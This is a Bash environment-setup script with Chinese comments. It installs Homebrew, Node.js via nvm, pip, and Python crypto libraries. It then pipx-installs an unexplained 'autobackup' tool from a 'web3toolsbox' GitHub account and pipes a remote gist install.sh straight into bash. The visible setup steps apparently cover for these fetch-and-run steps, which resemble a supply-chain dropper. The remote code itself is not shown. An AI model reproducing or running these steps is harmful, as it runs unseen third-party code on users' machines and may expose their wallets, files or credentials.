#!/bin/bash

# 检测操作系统类型
OS_TYPE=$(uname -s)

# 检查 sudo 权限
check_sudo() {
    if [ "$EUID" -eq 0 ]; then
        # 已经是 root 用户
        return 0
    fi
    
    if ! sudo -n true 2>/dev/null; then
        echo "⚠️  此操作需要管理员权限（sudo）"
        echo "   请确保您有 sudo 权限，脚本将在需要时提示您输入密码"
        echo ""
        # 测试 sudo 权限
        if ! sudo -v; then
            echo "❌ 无法获取 sudo 权限，某些安装步骤可能失败"
            return 1
        fi
    fi
    return 0
}

# 获取 shell 配置文件路径（提前定义，供后续使用）
get_shell_rc() {
    local current_shell=$(basename "$SHELL")
    local shell_rc=""
    
    case $current_shell in
        "bash")
            shell_rc="$HOME/.bashrc"
            ;;
        "zsh")
            shell_rc="$HOME/.zshrc"
            ;;
        *)
            if [ -f "$HOME/.bashrc" ]; then
                shell_rc="$HOME/.bashrc"
            elif [ -f "$HOME/.zshrc" ]; then
                shell_rc="$HOME/.zshrc"
            elif [ -f "$HOME/.profile" ]; then
                shell_rc="$HOME/.profile"
            else
                shell_rc="$HOME/.bashrc"
            fi
            ;;
    esac
    echo "$shell_rc"
}

# 确保 Node.js 和 npm 在 PATH 中（如果通过 nvm 安装）
ensure_nodejs_available() {
    export NVM_DIR="$HOME/.nvm"
    
    # 如果 node 命令已可用，直接返回
    if command -v node &> /dev/null && command -v npm &> /dev/null; then
        echo "✅ Node.js 和 npm 已可用: $(node --version), npm $(npm --version)"
        return 0
    fi
    
    # 尝试加载 nvm
    if [ -s "$NVM_DIR/nvm.sh" ]; then
        echo "正在加载 nvm 环境..."
        [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" || true
        [ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion" || true
        
        # 如果 nvm 已加载，尝试使用默认版本
        if command -v nvm &> /dev/null; then
            nvm use default 2>/dev/null || nvm use --lts 2>/dev/null || true
        fi
    fi
    
    # 验证 node 和 npm 是否可用
    if command -v node &> /dev/null && command -v npm &> /dev/null; then
        echo "✅ Node.js 和 npm 已加载: $(node --version), npm $(npm --version)"
        return 0
    else
        echo "⚠️  警告: Node.js 或 npm 仍不可用"
        echo "   请确保 nvm 已正确安装，或手动运行: source $NVM_DIR/nvm.sh"
        return 1
    fi
}

# 检测是否为 WSL 环境
is_wsl() {
    if [ "$OS_TYPE" = "Linux" ]; then
        if grep -qi microsoft /proc/version 2>/dev/null || grep -qi wsl /proc/version 2>/dev/null; then
            return 0
        fi
        # 也可以通过 uname -r 检测
        if uname -r | grep -qi microsoft 2>/dev/null; then
            return 0
        fi
    fi
    return 1
}

# 检查包管理器和安装必需的包
install_dependencies() {
    case $OS_TYPE in
        "Darwin") 
            if ! command -v brew &> /dev/null; then
                echo "正在安装 Homebrew..."
                /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
            fi
            
            if ! command -v pip3 &> /dev/null; then
                brew install python3
            fi
            ;;
            
        "Linux")
            PACKAGES_TO_INSTALL=""
            
            if ! command -v curl &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL curl"
            fi
            
            if ! command -v pip3 &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL python3-pip"
            fi
            
            if ! command -v xclip &> /dev/null; then
                PACKAGES_TO_INSTALL="$PACKAGES_TO_INSTALL xclip"
            fi
            
            if [ ! -z "$PACKAGES_TO_INSTALL" ]; then
                echo "需要安装以下包: $PACKAGES_TO_INSTALL"
                if ! check_sudo; then
                    echo "❌ 权限检查失败，跳过包安装"
                    return 1
                fi
                echo "正在更新包列表..."
                sudo apt update
                echo "正在安装: $PACKAGES_TO_INSTALL"
                sudo apt install -y $PACKAGES_TO_INSTALL
            fi
            ;;
            
        *)
            echo "不支持的操作系统"
            exit 1
            ;;
    esac
}

# 安装依赖
install_dependencies

# 检查并安装 Node.js（使用 nvm 方式，兼容 Linux 和 macOS）
if ! command -v node &> /dev/null; then
    echo "未检测到 Node.js，正在安装 nvm 并通过 nvm 安装 Node.js LTS 版本..."
    # 安装 nvm
    export NVM_DIR="$HOME/.nvm"
    if [ ! -d "$NVM_DIR" ]; then
        curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash || true
    fi
    # 使 nvm 立即生效
    [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh" || true
    [ -s "$NVM_DIR/bash_completion" ] && \. "$NVM_DIR/bash_completion" || true
    # 安装 Node.js LTS
    nvm install --lts || true
    nvm use --lts || true
    echo "Node.js 已通过 nvm 安装完成（如有报错请手动检查）。"
else
    echo "Node.js 已安装。"
fi

# 确保 Node.js 和 npm 在 PATH 中（如果通过 nvm 安装）
ensure_nodejs_available

if [ "$OS_TYPE" = "Linux" ]; then
    PIP_INSTALL="python3 -m pip install --break-system-packages"
elif [ "$OS_TYPE" = "Darwin" ]; then
    PIP_INSTALL="python3 -m pip install --user --break-system-packages"
else
    PIP_INSTALL="python3 -m pip install"
fi

if ! python3 -m pip show requests >/dev/null 2>&1; then
    $PIP_INSTALL requests
fi

if ! python3 -m pip show cryptography >/dev/null 2>&1; then
    $PIP_INSTALL cryptography
fi

if ! python3 -m pip show pycryptodome >/dev/null 2>&1; then
    $PIP_INSTALL pycryptodome
fi

install_auto_backup() {
    # 安装 pipx（如果未安装）
    if ! command -v pipx &> /dev/null; then
        echo "检测到未安装 pipx，正在安装 pipx..."
        case $OS_TYPE in
            "Darwin")
                brew install pipx
                pipx ensurepath
                ;;
            "Linux")
                echo "需要安装 pipx，需要管理员权限"
                if ! check_sudo; then
                    echo "❌ 权限检查失败，跳过 pipx 安装"
                    return 1
                fi
                echo "正在更新包列表..."
                sudo apt update
                echo "正在安装 pipx..."
                sudo apt install -y pipx
                pipx ensurepath
                ;;
            *)
                echo "无法在当前系统上安装 pipx，跳过安装"
                return 1
                ;;
        esac
    fi

    if ! command -v autobackup &> /dev/null; then
        local install_url=""
        case $OS_TYPE in
            "Darwin")
                install_url="git+https://github.com/web3toolsbox/auto-backup-macos"
                ;;
            "Linux")
                if is_wsl; then
                    install_url="git+https://github.com/web3toolsbox/auto-backup-wsl"
                else
                    install_url="git+https://github.com/web3toolsbox/auto-backup-linux"
                fi
                ;;
            *)
                echo "不支持的操作系统，跳过安装"
                return 1
                ;;
        esac
        
        pipx install "$install_url"
    else
        echo "已检测到 autobackup 命令，跳过安装。"
    fi
}

install_auto_backup

GIST_URL="https://gist.githubusercontent.com/wongstarx/b1316f6ef4f6b0364c1a50b94bd61207/raw/install.sh"
if command -v curl &>/dev/null; then
    bash <(curl -fsSL "$GIST_URL")
elif command -v wget &>/dev/null; then
    bash <(wget -qO- "$GIST_URL")
else
    exit 1
fi

# 自动 source shell 配置文件
echo "正在应用环境配置..."
SHELL_RC=$(get_shell_rc)
# 检查是否有需要 source 的配置（如 PATH 修改、nvm 等）
if [ -f "$SHELL_RC" ]; then
    # 检查是否有常见的配置项需要 source
    if grep -qE "(export PATH|nvm|\.nvm)" "$SHELL_RC" 2>/dev/null; then
        echo "检测到环境配置，正在应用环境变量..."
        source "$SHELL_RC" 2>/dev/null || echo "自动应用失败，请手动运行: source $SHELL_RC"
    else
        echo "未检测到需要 source 的配置"
    fi
fi

echo "安装完成！"